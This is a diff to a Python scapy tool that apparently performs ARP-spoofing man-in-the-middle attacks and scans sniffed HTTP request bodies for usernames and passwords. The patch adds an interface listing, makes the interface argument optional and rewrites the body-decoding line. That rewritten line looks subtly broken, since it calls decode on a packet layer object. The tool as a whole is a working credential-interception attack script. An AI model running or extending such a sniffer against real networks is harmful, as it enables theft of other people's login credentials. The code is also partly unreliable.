@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import argparse, time, threading
+import argparse, time, threading, sys, netifaces
 import scapy.all as scapy
 from scapy.layers import http
 
@@ -16,7 +16,7 @@ def ecouteReseau():
 
 
 def analysePaquet(packet):
-    if packet.haslayer(http.HTTPRequest) and packet[http.HTTPRequest].haslayer(http.HTTPRequest):
+    if packet.haslayer(http.HTTPRequest):
         extractUrl(packet)
         extractIds(packet)
 
@@ -29,7 +29,7 @@ keywords_to_search = ('username', 'uname', 'user', 'login', 'password', 'pass', 
 
 def extractIds(packet):
     if packet[http.HTTPRequest].haslayer(scapy.Raw):
-        body = packet[http.HTTPRequest].Raw.load.decode(errors="ignore")
+        body = packet[http.HTTPRequest].getlayer(scapy.Raw).decode('utf-8')
         for keyword in keywords_to_search:
             if keyword in body:
                 print(f"Keyword '{keyword}' found in the request body.")
@@ -61,7 +61,11 @@ def cleanSpoof(pdst, psrc):
     if args.verbose:
         print(f"[*] Packets sent {packet_sent}")
 
-
+def list_interfaces():
+    interfaces = netifaces.interfaces()
+    print("List of available network interfaces:")
+    for interface in interfaces:
+        print(f"- {interface}")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
@@ -71,7 +75,7 @@ if __name__ == "__main__":
     )
     parser.add_argument("-f", "--filter")
     parser.add_argument("-v", "--verbose", action="store_true")
-    parser.add_argument("-i", "--iface", required=True)
+    parser.add_argument("-i", "--iface")
     parser.add_argument("-c", "--count")
     parser.add_argument("-s", "--save", action="store_true")
 
@@ -81,7 +85,9 @@ if __name__ == "__main__":
     parser.add_argument("--delay", default=5)
 
     args = parser.parse_args()
-
+    if args.iface == None:
+        list_interfaces()
+        parser.error("You must specify iface")
     if args.mitm:
         spoof_running = True
         spoof_thread_target = threading.Thread(target=spoof, args=(args.target, args.mitm))
